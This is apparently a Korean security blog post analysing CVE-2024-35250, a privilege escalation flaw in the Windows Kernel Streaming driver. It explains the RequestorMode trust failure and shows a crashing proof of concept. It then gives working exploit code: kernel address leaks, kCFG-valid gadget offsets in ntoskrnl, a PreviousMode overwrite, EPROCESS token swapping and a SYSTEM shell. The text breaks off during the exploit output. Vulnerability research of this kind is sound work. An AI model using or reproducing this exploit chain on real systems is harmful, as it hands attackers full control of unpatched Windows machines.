---
layout: post
title: Windows Kernel Streaming Driver LPE Analysis (CVE-2024-35250)
description: Enable syntax highlighting in your site
summary: Enable syntax highlighting in your site.
comments: true
tags: [Windows, CVE Analysis]
---

## 개요

CVE-2024-35250은 Windows 커널 스트리밍  드라이버에서 발견된 로컬 권한 상승 취약점이다. 이 취약점은 Windows 10/11 및 Server 2008~2022 전반에 영향을 미치며, CVSS 기준 7.8점으로 높은 심각도를 가진다.

취약점의 핵심은 **신뢰되지 않은 포인터 역참조(Untrusted Pointer Dereference)**이다. 커널 스트리밍 드라이버(ks.sys)가 사용자 입력 버퍼를 처리하는 과정에서 신뢰 경계를 위반하여, 공격자가 제공한 악의적인 입력값이 커널 권한으로 실행되는 문제가 발생한다. 이를 통해 일반 사용자 권한의 공격자가 SYSTEM 권한을 획득할 수 있다.

본 글에서는 이 취약점의 Root Cause부터 시작하여 PoC 작성, 그리고 실제 Exploit 개발까지의 전 과정을 상세히 다룬다. Windows 커널 드라이버의 동작 원리를 이해하고, 취약점이 어떻게 발생하며 어떤 방식으로 악용될 수 있는지 살펴본다.

---

## 1. 배경 지식

Root Cause를 이해하기 위해서는 Windows 커널 드라이버의 핵심 개념들을 먼저 알아야 한다. 이 섹션에서는 IOCTL, IRP, 그리고 커널 스트리밍 아키텍처에 대해 설명한다.

### 1.1 IOCTL (Input Output Control)

IOCTL은 **사용자 모드(User Mode)와 커널 모드(Kernel Mode)를 연결하는 인터페이스**이다. 

일반적으로 사용자 애플리케이션은 커널이나 하드웨어에 직접 접근할 수 없다. 운영체제는 보안과 안정성을 위해 사용자 영역과 커널 영역을 엄격히 분리하기 때문이다. 그렇다면 사용자 프로그램이 하드웨어를 제어하거나 커널 기능을 사용하려면 어떻게 해야 할까?

이때 사용하는 것이 IOCTL이다. 사용자 애플리케이션은 `DeviceIoControl` API를 호출하여 특정 제어 코드와 함께 데이터를 커널 드라이버에 전달할 수 있다. 드라이버는 이 요청을 받아 해당 작업을 수행하고 결과를 반환한다.
![alt text](/assets/images/writings/IRP.png)

![IOCTL 통신 구조](/assets/images/writings/01-ioctl-communication.svg){: width="150%" height="auto"}

IOCTL 요청이 발생하면, Windows의 I/O Manager는 이 요청을 **IRP(I/O Request Packet)**라는 구조체로 변환하여 드라이버에 전달한다.

### 1.2 IRP (I/O Request Packet)

IRP는 커널 모드 내에서 드라이버 간, 또는 I/O Manager와 드라이버 간의 통신을 위해 사용되는 **핵심 데이터 구조체**이다. 쉽게 말해 **"작업 요청서"**와 같다.

사용자 애플리케이션이 파일 읽기, 쓰기, 또는 장치 제어 같은 I/O 작업을 요청하면 다음과 같은 처리 과정을 거친다.

1. **I/O Manager가 IRP를 생성**한다
2. 생성된 IRP를 해당 장치의 **드라이버 스택(Driver Stack)** 최상위 드라이버로 전달한다
3. 드라이버는 요청을 직접 처리하거나, 필요시 하위 드라이버로 IRP를 전달한다
4. 요청이 완료되면 결과가 다시 스택을 거슬러 올라가 요청자에게 반환된다

```
                    [I/O Manager]
                         │
                         ▼ IRP 생성 및 전달
                ┌─────────────────┐
                │  Driver Stack   │
                │  ┌───────────┐  │
                │  │ Driver A  │◄─┼── IRP 수신
                │  └─────┬─────┘  │
                │        │        │
                │        ▼        │
                │  ┌───────────┐  │
                │  │ Driver B  │  │     하위 드라이버로 전달
                │  └─────┬─────┘  │
                │        │        │
                │        ▼        │
                │  ┌───────────┐  │
                │  │ Hardware  │  │     최종 처리
                │  └───────────┘  │
                └─────────────────┘
```

IRP 구조체에는 여러 중요한 필드가 있는데, 이 중 취약점과 밀접한 관련이 있는 것이 **RequestorMode** 필드이다.

#### RequestorMode 필드

`RequestorMode`는 **IRP를 생성한 주체가 어느 모드에서 실행 중이었는지**를 나타낸다.

| 값 | 의미 | 설명 |
|---|---|---|
| 0 | KernelMode | 커널에서 생성된 IRP, 신뢰할 수 있음 |
| 1 | UserMode | 사용자 모드에서 생성된 IRP, 신뢰할 수 없음 |

드라이버는 이 값을 확인하여 **보안 검사를 수행할지 여부를 결정**한다. UserMode에서 온 요청이라면 드라이버는 `ProbeForRead`, `ProbeForWrite` 같은 함수로 버퍼의 유효성과 접근 권한을 검증해야 한다. 반면 KernelMode에서 온 요청이라면 이미 신뢰할 수 있다고 판단하여 검증을 생략할 수 있다.

이 RequestorMode 기반의 신뢰 판단이 바로 **CVE-2024-35250 취약점의 핵심**이 된다.

### 1.3 커널 스트리밍 (Kernel Streaming)

Windows는 실시간 멀티미디어 데이터(오디오, 비디오 등)의 효율적인 처리를 위해 **커널 스트리밍(Kernel Streaming, KS)** 프레임워크를 제공한다. 이 프레임워크는 커널 모드에서 직접 데이터를 처리하여 지연 시간을 최소화하고, 모듈식 설계로 다양한 하드웨어에 대한 확장성을 제공한다.

커널 스트리밍 아키텍처의 주요 구성 요소는 다음과 같다:

#### ksthunk.sys

`ksthunk.sys`는 커널 스트리밍 아키텍처의 **진입점(Entry Point)** 역할을 한다. 특히 WoW64(Windows 32-bit on Windows 64-bit) 핸들러로서, 64비트 환경에서 32비트 애플리케이션의 호환성 문제를 해결한다. 32비트 애플리케이션의 요청을 받아 적절히 변환한 후 `ks.sys`로 전달한다.

#### ks.sys

`ks.sys`는 커널 스트리밍의 **핵심 시스템 드라이버**이며, 클래스 드라이버(Class Driver) 역할을 수행한다. `IOCTL_KS_PROPERTY`, `IOCTL_KS_METHOD`와 같은 표준화된 IOCTL을 직접 처리하며, 구체적인 하드웨어 제어가 필요할 때는 해당 장치의 미니드라이버(Minidriver)를 호출한다.

```
[사용자 모드]
     │
  Application
     │
     ▼ IOCTL_KS_PROPERTY
─────────────────────────────────
[커널 모드]
     │
     ▼
┌─────────────┐
│ ksthunk.sys │ ◄── 진입점, 32/64비트 호환성 처리
└──────┬──────┘
       │
       ▼
┌─────────────┐
│   ks.sys    │ ◄── 클래스 드라이버, 핵심 처리
└──────┬──────┘
       │
       ▼
┌─────────────┐
│ Minidriver  │ ◄── 하드웨어별 처리
└─────────────┘
```

### 1.4 KS Property (커널 스트리밍 속성)

Windows 장치 드라이버는 사용자 모드에서 `DeviceIoControl` API를 통해 장치의 **속성(Property)**을 조회하거나 변경할 수 있다. 커널 스트리밍 드라이버에서 사용하는 이러한 속성을 **KS Property**라고 하며, `IOCTL_KS_PROPERTY` 제어 코드를 통해 설정한다.

#### IOCTL_KS_PROPERTY

`IOCTL_KS_PROPERTY`는 커널 스트리밍 환경에서 속성 값을 얻거나 설정할 때 사용되는 입출력 제어 코드이다. 사용자 애플리케이션이 `DeviceIoControl`을 호출하면 이 제어 코드가 드라이버에 전달된다.

이 요청을 처리하는 주요 함수가 `KsPropertyHandler`이며, 내부적으로 `KspPropertyHandler`를 호출한다:

```c
NTSTATUS __stdcall KsPropertyHandler(
    PIRP Irp, 
    ULONG PropertySetsCount, 
    const KSPROPERTY_SET *PropertySet)
{
    return KspPropertyHandler(Irp, 0, 0LL, 0);
}
```

---

## 2. Root Cause 분석

이제 배경 지식을 바탕으로 CVE-2024-35250의 근본 원인을 분석한다. 취약점은 **커널 스트리밍의 속성 역직렬화(Unserialization) 과정**에서 발생한다.

### 2.1 속성 스트림 직렬화와 역직렬화

한 번에 여러 개의 속성을 설정해야 할 경우, 속성마다 개별적으로 IOCTL을 호출하는 것은 비효율적이다. 이를 해결하기 위해 Microsoft는 `KspPropertyHandler`에 다음 두 가지 플래그를 도입했다:

| 플래그 | 역할 |
|---|---|
| `KSPROPERTY_TYPE_SERIALIZESET` | 여러 속성을 직렬화하여 하나의 버퍼로 반환 |
| `KSPROPERTY_TYPE_UNSERIALIZESET` | 직렬화된 버퍼를 역직렬화하여 각 속성에 설정 |

취약점은 `KSPROPERTY_TYPE_UNSERIALIZESET` 플래그가 설정된 요청을 처리하는 `UnserializePropertySet` 함수에서 발생한다.

```c
NTSTATUS __fastcall KspPropertyHandler(PIRP Irp, ...)
{
    ...
    if ( v24 == 4096 )  // KSPROPERTY_TYPE_UNSERIALIZESET
        return UnserializePropertySet(Irp, v22, v7);
    ...
}
```

### 2.2 RequestorMode 기반 검증

사용자 애플리케이션이 `DeviceIoControl`을 통해 IOCTL 요청을 보내면, I/O Manager는 IRP를 생성하면서 `RequestorMode`를 **UserMode(1)**로 설정한다. 이후 KS 드라이버(ksthunk.sys, ks.sys)는 이 값을 확인하여 검증 여부를 결정한다.

```c
if ( Irp->RequestorMode )  // UserMode인 경우
{
    ProbeForRead(CurrentStackLocation->Parameters.CreatePipe.Parameters, 
                 Options, 1u);  // 버퍼 유효성 검증
    ...
}
```

- `RequestorMode = 1` (UserMode): 신뢰하지 않는 버퍼로 판단, 검증 수행
- `RequestorMode = 0` (KernelMode): 신뢰할 수 있는 버퍼로 판단, 검증 생략

첫 번째 IOCTL 요청은 사용자 모드에서 이루어지므로, I/O Manager는 IRP의 `RequestorMode`를 1로 설정하고, `KspPropertyHandler` 내부의 검증은 정상적으로 수행된다.

```
[UserMode]                          [KernelMode]
     │                                   │
 Application                        ks.sys
     │                                   │
     ├── IOCTL_KS_PROPERTY ────────────►│
     │   RequestorMode = UserMode        │
     │                                   ├── KsPropertyHandler
     │                                   ├── KspPropertyHandler
     │                                   │   └── RequestorMode 검사 (검증 O)
     │                                   │
```

### 2.3 취약점의 핵심: IOCTL 재호출

문제는 `UnserializePropertySet` 함수 내부에서 발생한다. 이 함수는 직렬화된 속성들을 하나씩 역직렬화하면서 **각 속성에 대해 IOCTL을 재호출**한다. 이때 `KsSynchronousIoControlDevice` 함수를 사용한다.

```c
v16 = KsSynchronousIoControlDevice(
    *(PFILE_OBJECT *)(v6 + 48),  // FileObject
    0,                           // RequestorMode ← 주목!
    *(_DWORD *)(v6 + 24),        // IoControl
    PoolWithTag,                 // InBuffer (사용자 데이터 복사본)
    InSize,
    OutBuffer,
    OutSize,
    &BytesReturned);
```

위 함수의 파라미터를 보면 **두 번째 인자가 0으로 하드코딩**되어 있다. 이 값은 새로 생성되는 IRP의 `RequestorMode`를 설정하는 데 사용된다.

| 인자 값 | 의미 |
|---|---|
| 0 | KernelMode |
| 1 | UserMode |

즉, `UnserializePropertySet`이 내부적으로 IOCTL을 재호출할 때, **새로운 IRP의 RequestorMode가 KernelMode(0)로 설정**된다.

### 2.4 신뢰 경계 위반

`KsSynchronousIoControlDevice` 함수의 내부를 살펴보자.

```c
NTSTATUS __stdcall KsSynchronousIoControlDevice(...)
{
    ...
    // 새로운 IRP 생성
    NewIrp = IoBuildDeviceIoControlRequest(
        IoControl,
        RelatedDeviceObject,
        InBuffer,           // 사용자 데이터가 복사된 버퍼
        InSize,
        OutBuffer,
        OutSize,
        0,                  // InternalDeviceIoControl
        &Event,
        &IoStatusBlock);
    
    // RequestorMode를 전달받은 값(0 = KernelMode)으로 설정
    NewIrp->RequestorMode = RequestorMode;
    
    ...
    
    // 드라이버로 IRP 전달
    Status = IofCallDriver(RelatedDeviceObject, NewIrp);
}
```

`IoBuildDeviceIoControlRequest` 함수로 새 IRP를 생성한 후, `RequestorMode`를 전달받은 값으로 설정한다. `UnserializePropertySet`이 0을 전달했으므로, **새 IRP는 KernelMode에서 생성된 것으로 표시**된다.

Microsoft 공식 문서에서도 이 동작을 확인할 수 있다:

> "In the IRP that IoBuildDeviceIoControlRequest returns, the RequestorMode field is always set to KernelMode. This value indicates that the request, and any information contained in the request, is from a trusted, kernel-mode component."

**문제는 새 IRP에 포함된 데이터 버퍼가 신뢰할 수 없는 사용자 모드에서 온 데이터를 그대로 담고 있다는 점이다.**

![취약점 발생 흐름](/assets/images/writings/03-vulnerability-flow.svg){:width="150%" height="auto"}

### 2.5 검증 우회와 임의 함수 호출

새로 생성된 IRP는 IOCTL 재요청을 통해 `ksthunk.sys`로 전달된다. `CKSThunkDevice::CheckIrpForStackAdjustmentNative` 함수는 `RequestorMode`만으로 IRP 검증 여부를 판별한다:

```c
__int64 __fastcall CKSThunkDevice::CheckIrpForStackAdjustmentNative(
    __int64 a1, struct _IRP *irp, __int64 a3, int *a4)
{
    ...
    // DrmAudioStream 속성 집합을 처리하는 경우
    if ( *(_OWORD *)&Type3InputBuffer->Set == *(_OWORD *)&KSPROPSETID_DrmAudioStream
         && !type3inputbuf.Id
         && (type3inputbuf.Flags & 2) != 0 )
    {
        ...
        if ( a2->RequestorMode )  // UserMode면 에러 반환
        {
            v14 = -1073741808;  // STATUS_INVALID_PARAMETER
        }
        else  // KernelMode면 검증 없이 진행
        {
            UserBuffer = (unsigned int *)a2->UserBuffer;
            ...
            // 사용자 버퍼에서 함수 포인터를 가져와 호출!
            v14 = ((__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD *))
                   Type3InputBuffer[7])(*UserBuffer, 0, v20);
        }
    }
    ...
}
```

`RequestorMode`가 KernelMode(0)로 설정되어 있으므로 아래의 문제가 발생한다.
1. 주소 유효성 및 접근 권한 검증(ProbeForRead/Write)이 **생략**된다
2. DrmAudioStream 속성 집합 처리 시, **사용자 입력 버퍼에서 함수 포인터를 가져와 호출**한다
3. 이때 사용자 버퍼의 값이 **함수 호출의 첫 번째 인자(rcx)**로 직접 사용된다

**이를 통해 공격자는 임의의 커널 함수를 원하는 인자와 함께 호출할 수 있게 된다.**

### 2.6 Microsoft 가이드라인 위반

Microsoft는 IoBuildDeviceIoControlRequest 관련 문서에서 다음과 같이 명시하고 있다.

> "If the caller cannot validate parameter values that it copies from a user-mode buffer to the input buffer, or if these values must not be interpreted as coming from a kernel-mode component, the caller should set the RequestorMode field in the IRP to UserMode. This setting informs the driver that handles the I/O control request that the buffer contains untrusted, user-mode data."

**번역**: 호출자가 사용자 모드 버퍼에서 복사한 매개변수 값을 검증할 수 없거나, 해당 값이 커널 모드 구성 요소에서 온 것으로 해석되어서는 안 되는 경우, 호출자는 IRP의 RequestorMode 필드를 UserMode로 설정해야 한다.

그러나 `UnserializePropertySet`은 사용자 데이터를 포함한 IRP를 생성하면서 `RequestorMode`를 **KernelMode로 설정**했다. 이는 Microsoft의 핵심 보안 가이드라인을 **정면으로 위반**하는 것이다.

### 2.7 Root Cause 요약

CVE-2024-35250의 근본 원인은 다음 세 가지 조건의 결합이다.

| 조건 | 설명 |
|---|---|
| **1. KsSynchronousIoControlDevice 활용** | IOCTL 재호출 시 새 IRP 생성 |
| **2. 제어 가능한 입출력 버퍼** | 공격자가 입력/출력 버퍼 내용을 제어 가능 |
| **3. RequestorMode 기반 보안 검사** | 새 IRP의 RequestorMode가 KernelMode로 설정되어 검증 우회 |

이에 따라 공격자는 아래와 같이 취약점을 촉발할 수 있다.
1. 조작된 입력 버퍼로 역직렬화 루틴 진입
2. RequestorMode 검증 우회
3. 임의 커널 주소에 대한 읽기/쓰기 수행
4. **권한 상승(Elevation of Privilege)** 달성

---

## 3. PoC (Proof of Concept)

PoC는 취약점의 존재와 취약 조건을 입증하기 위한 코드이다. Root Cause 분석에서 확인한 내용을 바탕으로, IRP의 검증이 생략될 때 **잘못된 주소를 넣어도 검증하지 않는다**는 점을 이용하여 임의 주소 호출을 트리거하는 PoC를 작성한다.

### 3.1 DRM 장치 핸들 획득

취약한 커널 스트리밍 디바이스에 접근하기 위해 DRM 장치 핸들을 연다. DRM 장치를 선정한 이유는 `DrmAudioStream` 속성 집합을 통해 취약한 코드 경로에 도달할 수 있기 때문이다.

```c
HANDLE GetKsDevice(const GUID categories) {
    HANDLE hDevice = 0;
    HRESULT hr = KsOpenDefaultDevice(&categories, 
                                     GENERIC_READ | GENERIC_WRITE, 
                                     &hDevice);
    if (hr != NOERROR) return NULL;
    return hDevice;
}
```

획득한 DRM 장치 핸들은 이후 `DeviceIoControl` 함수를 통해 취약한 IOCTL 명령을 전송하는 데 사용된다.

### 3.2 입출력 버퍼 구성

취약점을 트리거하기 위한 입력 버퍼와 출력 버퍼를 구성한다.

```
[InputBuffer] 커널 드라이버가 역직렬화를 수행하도록 만든 입력 데이터
    ptr_ArbitraryFunCall = 0x4242424242424242
                           → 유효하지 않은 주소 참조

[OutputBuffer] rcx에 전달될 주소값을 포함한 출력 데이터
    Destination = 0xDEADBEEFDEADBEEF
                  → 임의의 인자값 할당
```

입력 버퍼는 드라이버가 취약한 역직렬화 루틴으로 진입하도록 유도하며 공격자가 지정한 유효하지 않은 주소로 코드 실행 흐름을 변경한다. 출력 버퍼는 역직렬화 루틴에서 처리할 직렬화 항목의 수를 지정하고 사용자가 구성한 구조체의 주소를 rcx 레지스터에 로드되도록 유도한다.

### 3.3 콜스택 흐름

IOCTL 요청이 커널에 전달된 후 취약점이 발생하는 경로는 다음과 같다.

```
┌─────────────────────────────────────────────────────────┐
│ DeviceIoControl                                         │
│   └── KsSynchronousIoControlDevice                      │
│         └── UnserializePropertySet                      │
│               └── KsPropertyHandler                     │
│                     └── CKSThunkDevice::                │
│                         CheckIrpForStackAdjustmentNative│
│                           └── guard_dispatch_icall_nop  │ ← 크래시 발생
└─────────────────────────────────────────────────────────┘
```

1. **UserMode에서 DeviceIoControl() 호출**: 커널의 `NtDeviceIoControlFile`을 통해 시스템 콜로 진입
2. **ks!KsSynchronousIoControlDevice**: IOCTL 요청을 동기 방식으로 처리, `IRP_MJ_DEVICE_CONTROL` 처리 시작
3. **ks!UnserializePropertySet (취약 지점)**: 사용자 입력 버퍼를 읽고 내부 구조체로 역직렬화
4. **ks!KspPropertyHandler**: 특정 ID값(예: 0x45)을 넣어 취약한 경로로 유도
5. **ksthunk!CKSThunkDevice::CheckIrpForStackAdjustmentNative**: Thunk 디바이스가 IRP 구성 확인
6. **ksthunk!guard_dispatch_icall_nop (크래시 발생 지점)**: 유효하지 않은 커널 주소로 제어 흐름이 넘어가면서 크래시 발생

### 3.4 크래시 결과 분석

PoC 실행 결과, 다음과 같은 BSOD가 발생한다.

```
BUGCHECK_CODE:  3b
BUGCHECK_P1:    c0000005
BUGCHECK_P2:    fffff80170b13380
BUGCHECK_P3:    fffff986af506100
BUGCHECK_P4:    0

CONTEXT:  fffff986af506100
rax=4242424242424242 rbx=ffff9a07d9e709a0 rcx=00000000deadbeef
...
ksthunk!guard_dispatch_icall_nop:
fffff801`70b13380 ffe0    jmp    rax {42424242`42424242}
```

**BugCheck 파라미터 분석:**

| 파라미터 | 값 | 의미 |
|---|---|---|
| 오류코드 | 3b (SYSTEM_SERVICE_EXCEPTION) | 권한이 없는 코드에서 권한 있는 코드로 전환하는 루틴 실행 중 예외 발생 |
| P1 | 0xC0000005 | Access Violation (잘못된 메모리 참조) |
| P2 | 0xFFFFF80170B13380 | 오류가 발생한 명령어 주소 (RIP) |
| P3 | 0xFFFFF986AF506100 | 오류 발생 시점의 스택/문맥 주소 |

크래시는 사용자 모드에서 전달된 비정상 함수 포인터가 `rax` 레지스터에 로드된 후, `jmp rax` 명령을 통해 공격자가 지정한 주소(0x4242424242424242)로 제어 흐름이 변경되면서 발생했다. 이 주소는 커널에서 유효하지 않은 주소이므로 Access Violation이 발생하여 BSOD로 이어졌다.

**이로써 취약점의 존재와 임의 주소 호출이 가능함을 입증했다.**

---

## 4. Exploit

PoC에서 취약점의 존재를 입증했다. 이제 이를 실제 **권한 상승(Local Privilege Escalation)**으로 확장한다.

### 4.1 Exploit으로의 확장

취약점을 통해 다음 두 가지 핵심 요소를 제어할 수 있음을 확인했다.

1. **임의 함수 호출**: `UnserializePropertySet` → IOCTL 재호출 → `jmp rax` 명령을 통해 사용자 데이터에서 가져온 주소로 점프
2. **첫 번째 인자 제어**: `rcx` 레지스터를 통해 사용자 모드 포인터를 전달 가능 (하위 4바이트 부분 제어)

그러나 실제 Exploit을 성공시키려면 Windows의 여러 보호 기법을 우회해야 한다.

### 4.2 우회해야 할 보호 기법

| 보호 기법 | 설명 | 우회 전략 |
|---|---|---|
| **kASLR** (Kernel Address Space Layout Randomization) | 커널 모듈 주소 무작위화 | NtQuerySystemInformation으로 런타임에 모듈 주소 동적 획득 |
| **SMEP** (Supervisor Mode Execution Prevention) | 커널 모드에서 사용자 영역 코드 실행 방지 | 쉘코드 대신 커널 가젯 활용 |
| **kCFG** (Kernel Control Flow Guard) | 간접 호출 시 유효한 함수 주소인지 비트맵 검사 | kCFG 비트맵에 등록된 함수만 호출 대상으로 사용 |

SMEP와 kCFG로 인해 **사용자 모드에 위치한 쉘코드나 임의의 ROP 가젯을 직접 실행하는 방식은 사용할 수 없다**. SMEP 우회 가젯으로 CR4 레지스터를 조작하더라도 kCFG가 유효하지 않은 간접 호출을 차단하기 때문이다.

따라서 본 Exploit은 **kCFG 비트맵에 등록된 유효한 커널 함수를 가젯으로 활용**하여 커널 구조체를 직접 조작하는 방식을 사용한다.

### 4.3 Exploit 전략

LPE를 달성하기 위한 전체 전략은 다음과 같다.

![익스플로잇 흐름](/assets/images/writings/05-exploit-strategy.svg){:width="150%" height="auto"}

### 4.4 주요 개념 설명

#### PreviousMode

`PreviousMode`는 `KTHREAD` 구조체의 필드로, 현재 스레드가 어떤 모드에서 호출되었는지를 나타낸다.

| 값 | 의미 |
|---|---|
| 0 | KernelMode |
| 1 | UserMode |

이 값은 `NtWriteVirtualMemory`, `NtReadVirtualMemory` 같은 시스템 콜에서 **커널 주소에 대한 접근을 허용할지 결정**하는 데 사용된다. 정상적으로는 UserMode 프로세스가 호출하면 `PreviousMode = 1`이므로 커널 메모리에 직접 접근할 수 없다.

하지만 취약점을 통해 `PreviousMode`를 0으로 변조하면 커널은 해당 스레드가 커널 모드에서 호출된 것으로 판단하여 **커널 주소에 대한 읽기/쓰기를 허용**하게 된다.

#### Token Swapping

Windows에서 각 프로세스는 `EPROCESS` 구조체를 가지며, 이 구조체의 `Token` 필드에는 해당 프로세스의 **권한 정보**가 저장된다. Token Swapping은 현재 프로세스의 Token을 SYSTEM 프로세스(PID 4)의 Token으로 덮어써 **SYSTEM 권한을 획득**하는 기법이다.

### 4.5 Exploit 구현

#### 4.5.1 kASLR 우회 - 커널 주소 유출

`NtQuerySystemInformation` API를 사용하여 필요한 커널 주소들을 런타임에 동적으로 추출한다.

**커널 객체 주소 획득:**

```c
int32_t GetObjPtr(_Out_ PULONG64 ppObjAddr, _In_ ULONG ulPid, _In_ HANDLE handle)
{
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
    ULONG ulBytes = 0;
    NTSTATUS Status = STATUS_SUCCESS;

    // 시스템의 모든 핸들 정보를 가져올 때까지 버퍼 크기 조정
    while ((Status = NtQuerySystemInformation(
                (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, 
                pHandleInfo, ulBytes, &ulBytes)) == 0xC0000004L)
    {
        // 버퍼 재할당
    }

    // 지정된 PID와 핸들 값에 일치하는 객체 검색
    for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
    {
        if (pHandleInfo->Handles[i].UniqueProcessId == ulPid &&
            pHandleInfo->Handles[i].HandleValue == (USHORT)(ULONG_PTR)handle)
        {
            *ppObjAddr = (ULONG64)(ULONG_PTR)pHandleInfo->Handles[i].Object;
            return 0;
        }
    }
    return -1;
}
```

이 함수로 다음 커널 객체들의 주소를 획득한다.

| 객체 | 용도 |
|---|---|
| 현재 스레드 (KTHREAD) | PreviousMode 필드 주소 계산 |
| 현재 프로세스 (EPROCESS) | Token 필드 덮어쓰기 대상 |
| SYSTEM 프로세스 (EPROCESS, PID 4) | Token 값 복사 원본 |

**커널 모듈 주소 획득:**

```c
UINT_PTR GetKernelModuleAddress(const char* TargetModule)
{
    NTSTATUS status;
    ULONG ulBytes = 0;
    PSYSTEM_MODULE_INFORMATION handleTableInfo = NULL;

    while ((status = NtQuerySystemInformation(
                (SYSTEM_INFORMATION_CLASS)SystemModuleInformation, 
                handleTableInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        // 버퍼 재할당
    }

    for (ULONG i = 0; i < handleTableInfo->ModulesCount; i++)
    {
        char* moduleName = strstr(handleTableInfo->Modules[i].Name, TargetModule);
        if (moduleName != NULL)
        {
            return (UINT_PTR)handleTableInfo->Modules[i].ImageBaseAddress;
        }
    }
    return 0;
}
```

`ntoskrnl.exe`의 베이스 주소를 획득하여 이후 kCFG 우회 가젯의 실제 주소를 계산하는 데 사용한다.

#### 4.5.2 kCFG 우회 가젯 선정

kCFG를 우회하면서 `PreviousMode`를 0으로 변조하기 위해 다음 조건을 만족하는 커널 함수를 찾아야 한다.

1. **단일 인자(rcx)만 사용하거나**, 단일 인자만으로 원하는 주소에 값을 쓸 수 있어야 함
2. **내부에서 `[[rcx]] = value` 또는 `*(*rcx + offset) = value` 형태의 메모리 쓰기** 동작 수행
3. **쓰기 대상 주소가 rcx 또는 rcx로부터 유도 가능**해야 함 (UserMode에서 제어 가능)
4. **kCFG 비트맵(GuardCFFunctionTable)에 등록**되어 있어야 함

분석을 통해 두 가지 유효한 가젯을 발견했다.

**가젯 1: DbgkpTriageDumpRestoreState**

IDA로 분석한 결과, 이 함수는 rcx 레지스터 하나만 참조하며 다음 연산을 수행한다.

```
[[rcx] + 0x2078] = [rcx + 0x10]
[[rcx] + 0x207C] = [rcx + 0x14]
```

```
PAGE:00000001407F26F0  mov     eax, [rcx+0Ch]
PAGE:00000001407F26F3  mov     rdx, [rcx]
PAGE:00000001407F26F6  mov     [rcx+18h], eax
PAGE:00000001407F26F9  mov     eax, [rcx+10h]
PAGE:00000001407F26FC  mov     [rdx+2078h], eax    ; [[rcx] + 0x2078] = [rcx + 0x10]
PAGE:0000000140702702  mov     rdx, [rcx]
PAGE:0000000140702705  mov     eax, [rcx+14h]
PAGE:0000000140702708  mov     [rdx+207Ch], eax    ; [[rcx] + 0x207C] = [rcx + 0x14]
PAGE:000000014070270E  retn
```

즉, rcx가 가리키는 구조체를 통해 **임의의 커널 주소에 원하는 8바이트 값을 쓸 수 있다**.

PE-Bear로 `ntoskrnl.exe`의 GuardCFFunctionTable을 확인한 결과, 이 함수가 kCFG 비트맵에 등록되어 있음을 확인했다.

**가젯 2: ExpProfileDelete**

이 함수는 내부적으로 `ObfDereferenceObjectWithTag`를 호출하여 객체의 레퍼런스 카운트를 감소시킨다.

```c
void __fastcall ExpProfileDelete(__int64 a1)
{
    ...
    if ( *(_QWORD *)a1 )
        ObfDereferenceObjectWithTag(*(PVOID *)a1, 0x66507845u);
}
```

레퍼런스 카운트는 객체 주소에서 -0x30 위치(`_OBJECT_HEADER`의 `PointerCount` 필드)에 있으므로, 원하는 주소 + 0x30을 인자로 전달하면 **해당 주소의 값을 1 감소**시킬 수 있다.

`PreviousMode`가 1에서 0으로 변경되어야 하므로, 이 가젯을 사용하여 1바이트를 감소시키면 된다.

#### 4.5.3 Arbitrary Write Primitive 구성

**방법 1: DbgkpTriageDumpRestoreState 사용**

```c
// 낮은 주소에 메모리 할당 (rcx 하위 4바이트만 전달되므로)
void* alloc_addr = VirtualAlloc((void*)0x10000000, 0x1000, 
                                MEM_COMMIT | MEM_RESERVE, 
                                PAGE_EXECUTE_READWRITE);
memset(alloc_addr, 0, 0x1000);

uint64_t* qwords = (uint64_t*)alloc_addr;
uint32_t* dwords = (uint32_t*)alloc_addr;

// 구조체 구성
// 0x00: 덮을 주소 - 0x2078
qwords[0x00 / 8] = Curthread + 0x232 - 0x2078;  // PreviousMode offset = 0x232

// 0x10: 쓸 값의 하위 4바이트 (0x00000801 → 0x00000800)
dwords[0x10 / 4] = 0x00000800;

// 0x14: 쓸 값의 상위 4바이트 (주변 필드 보존)
dwords[0x14 / 4] = 0x00100100;

// 가젯 주소 설정
pInBufData->ptr_ArbitraryFunCall = (void*)(ULONG_PTR)(nt_base + 0x7f26f0);

// rcx에 전달될 주소
pOutBufData->Destination = (void*)(ULONG_PTR)(0x10000000);
```

![메모리 레이아웃](/assets/images/writings/06-memory-layout.svg){:width="150%" height="auto"}

**방법 2: ExpProfileDelete 사용**

```c
// 공격 대상 주소 계산
uint64_t previous_mode_addr = (uint64_t)Curthread + 0x232;
uint64_t indirect_pointer_value = previous_mode_addr + 0x30;

// 가상 메모리 할당
void* fake_rcx = (void*)0x10000000;
VirtualAlloc(fake_rcx, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memset(fake_rcx, 0, 0x1000);

// fake_rcx가 가리키는 곳에 간접 주소 설정
*(uint64_t*)fake_rcx = indirect_pointer_value;

// 가젯 주소 설정
pInBufData->ptr_ArbitraryFunCall = (void*)(ULONG_PTR)(nt_base + 0xA023D0);

// rcx에 전달될 주소
pOutBufData->Destination = (void*)(ULONG_PTR)((uint64_t)fake_rcx);
```

#### 4.5.4 Token Swapping 및 권한 상승

취약한 IOCTL 호출 후 `PreviousMode`가 0으로 변조되면 `NtWriteVirtualMemory`로 커널 메모리에 직접 쓸 수 있게 된다:

```c
char mode = 1;

// Token Swapping: 현재 프로세스 Token을 SYSTEM Token으로 덮어쓰기
NtWriteVirtualMemory(GetCurrentProcess(), 
    (void*)(ULONG_PTR)(Curproc + 0x4b8),   // 현재 프로세스 Token 주소
    (void*)(ULONG_PTR)(Sysproc + 0x4b8),   // SYSTEM 프로세스 Token 주소
    TOKEN_SIZE, 0);                         // EPROCESS->Token offset: 0x4b8

// PreviousMode 복구 (1 = UserMode)
NtWriteVirtualMemory(GetCurrentProcess(), 
    (void*)(ULONG_PTR)(Curthread + 0x232), // PreviousMode 주소
    &mode,                                  // 1 (UserMode)
    sizeof(mode), 0);                       // PreviousMode offset: 0x232

// SYSTEM 권한 쉘 실행
system("cmd.exe");
```

그런데 `PreviousMode`를 복구하지 않고 새 프로세스를 생성할 경우 커널이 유효하지 않은 주소에 접근하여 BSOD가 발생할 수 있다. 따라서 권한 상승 직후 반드시 `PreviousMode`를 UserMode(1)로 복구해야 한다.

### 4.6 Exploit 결과

Exploit 실행 결과:

```
C:\Users\user>whoami
desktop-xxx\user

C:\Users\user>exploit.exe
[+] System EPROCESS: 0xffffb487430ef040
